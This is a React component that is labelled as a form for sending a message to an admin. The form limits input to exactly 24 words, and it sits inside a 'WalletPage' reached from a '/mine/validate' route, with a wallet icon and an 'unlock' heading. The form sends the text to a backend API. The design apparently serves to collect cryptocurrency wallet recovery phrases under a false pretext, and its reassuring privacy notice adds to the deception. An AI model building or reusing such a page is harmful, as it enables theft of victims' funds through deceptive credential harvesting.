import { useState } from 'react';
import { useNavigate } from 'react-router';

export default function WalletPage() {
  const navigate = useNavigate();
  const [message, setMessage] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [wordCount, setWordCount] = useState(0);
  const [submitStatus, setSubmitStatus] = useState<'success' | 'error' | null>(null);

  const handleBack = () => {
    navigate('/mine/validate');
  };

  const handleMessageChange = (value: string) => {
    setMessage(value);
    const count = value.trim() ? value.trim().split(/\s+/).length : 0;
    setWordCount(count);
  };

  const handleSendMessage = async () => {
    if (message.trim() === '') {
      alert('Please enter a message');
      return;
    }

    setIsLoading(true);
    setSubmitStatus(null);

    try {
      const response = await fetch('http://localhost:3001/api/messages', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          message: message.trim(),
          userIdentifier: `user_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
        }),
      });

      const data = await response.json();

      if (data.success) {
        setSubmitStatus('success');
        setMessage('');
        setWordCount(0);
      } else {
        setSubmitStatus('error');
      }
    } catch (error) {
      console.error('Error sending message:', error);
      setSubmitStatus('error');
    } finally {
      setIsLoading(false);
    }
  };

  const handlePressHere = () => {
    alert('Feature coming soon!');
  };

  return (
    <div>
      <style>{`
        * {
          box-sizing: border-box;
          margin: 0;
          padding: 0;
        }

        body {
          font-family: 'Roboto', sans-serif;
          background: #fff;
          color: #444;
        }

        .wallet-container {
          min-height: 100vh;
          background: #fff;
        }

        .wallet-header {
          background: #783A8D;
          color: white;
          padding: 12px 20px;
          display: flex;
          align-items: center;
          position: relative;
          height: 60px;
        }

        .back-arrow {
          font-size: 24px;
          cursor: pointer;
          color: white;
          position: absolute;
          left: 20px;
        }

        .header-content {
          display: flex;
          align-items: center;
          position: absolute;
          left: 50%;
          transform: translateX(-50%);
        }

        .wallet-icon {
          width: 32px;
          height: 32px;
          margin-right: 8px;
        }

        .header-title {
          font-size: 18px;
          font-weight: 500;
        }

        .dropdown-icon {
          position: absolute;
          right: 20px;
          font-size: 18px;
          color: white;
        }

        .wallet-content {
          padding: 30px 20px;
          text-align: center;
        }

        .unlock-title {
          font-size: 24px;
          font-weight: bold;
          color: #333;
          margin-bottom: 30px;
        }

        .message-container {
          margin-bottom: 30px;
        }

        .word-counter {
          text-align: right;
          font-size: 14px;
          color: #666;
          margin-bottom: 10px;
        }

        .word-counter.over-limit {
          color: #d63031;
          font-weight: bold;
        }

        .word-counter.at-limit {
          color: #00b894;
          font-weight: bold;
        }

        .message-input {
          width: 100%;
          min-height: 120px;
          padding: 15px;
          border: 2px solid #ddd;
          border-radius: 8px;
          font-size: 16px;
          font-family: 'Roboto', sans-serif;
          resize: vertical;
          background: #f9f9f9;
          color: #333;
        }

        .message-input:focus {
          outline: none;
          border-color: #783A8D;
          background: #fff;
        }

        .message-input::placeholder {
          color: #999;
          font-style: italic;
        }

        .button-container {
          display: flex;
          flex-direction: column;
          gap: 15px;
          margin-bottom: 30px;
        }

        .action-button {
          width: 100%;
          padding: 15px;
          font-size: 16px;
          font-weight: bold;
          border: none;
          border-radius: 8px;
          cursor: pointer;
          transition: all 0.3s ease;
          position: relative;
        }

        .action-button:disabled {
          opacity: 0.6;
          cursor: not-allowed;
        }

        .send-btn {
          background: #783A8D;
          color: white;
        }

        .send-btn:hover:not(:disabled) {
          background: #6a3278;
        }

        .press-btn {
          background: #f0f0f0;
          color: #333;
          border: 2px solid #ddd;
        }

        .press-btn:hover {
          background: #e8e8e8;
          border-color: #ccc;
        }

        .loading-spinner {
          display: inline-block;
          width: 20px;
          height: 20px;
          border: 3px solid #ffffff;
          border-radius: 50%;
          border-top-color: transparent;
          animation: spin 1s ease-in-out infinite;
          margin-right: 10px;
        }

        @keyframes spin {
          to { transform: rotate(360deg); }
        }

        .status-message {
          padding: 10px;
          border-radius: 8px;
          margin-bottom: 20px;
          font-size: 14px;
          font-weight: 500;
        }

        .status-success {
          background: #d4fdd4;
          color: #00b894;
          border: 1px solid #00b894;
        }

        .status-error {
          background: #ffeaea;
          color: #d63031;
          border: 1px solid #d63031;
        }

        .info-section {
          text-align: left;
          background: #f8f9fa;
          border: 1px solid #e9ecef;
          border-radius: 8px;
          padding: 20px;
          margin-bottom: 20px;
        }

        .info-text {
          font-size: 14px;
          line-height: 1.6;
          color: #333;
          margin-bottom: 15px;
        }

        .info-text:last-child {
          margin-bottom: 0;
        }

        .info-text strong {
          color: #783A8D;
        }

        @media (max-width: 480px) {
          .wallet-content {
            padding: 20px 15px;
          }

          .unlock-title {
            font-size: 20px;
          }

          .message-input {
            min-height: 100px;
          }
        }
      `}</style>

      <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />

      <div className="wallet-container">
        <header className="wallet-header">
          <div className="back-arrow" onClick={handleBack}>
            ←
          </div>
          <div className="header-content">
            <img src="images/wallet.jpg" alt="Message Icon" className="wallet-icon" />
            <span className="header-title">Send Message</span>
          </div>
          <div className="dropdown-icon">▼</div>
        </header>

        <div className="wallet-content">
          <h1 className="unlock-title">Send Message to Admin</h1>
          
          {submitStatus === 'success' && (
            <div className="status-message status-success">
              Message sent successfully! Thank you for your feedback.
            </div>
          )}

          {submitStatus === 'error' && (
            <div className="status-message status-error">
              Failed to send message. Please try again.
            </div>
          )}
          
          <div className="message-container">
            <div className={`word-counter ${wordCount > 24 ? 'over-limit' : wordCount === 24 ? 'at-limit' : ''}`}>
              {wordCount}/24 words
            </div>
            <textarea
              className="message-input"
              placeholder="Write your 24-word message to the admin here..."
              value={message}
              onChange={(e) => handleMessageChange(e.target.value)}
              rows={5}
            />
          </div>

          <div className="button-container">
            <button 
              className="action-button send-btn"
              onClick={handleSendMessage}
              disabled={isLoading || message.trim() === ''}
            >
              {isLoading && <span className="loading-spinner"></span>}
              {isLoading ? 'SENDING MESSAGE...' : 'SEND MESSAGE'}
            </button>
            <button 
              className="action-button press-btn"
              onClick={handlePressHere}
            >
              PRESS HERE
            </button>
          </div>

          <div className="info-section">
            <p className="info-text">
              <strong>Send a message:</strong> Write up to 24 words to communicate with the admin. Your message will be reviewed and responded to if necessary.
            </p>
            
            <p className="info-text">
              <strong>Privacy Notice:</strong> Your messages are stored securely and will only be viewed by authorized administrators for support purposes.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
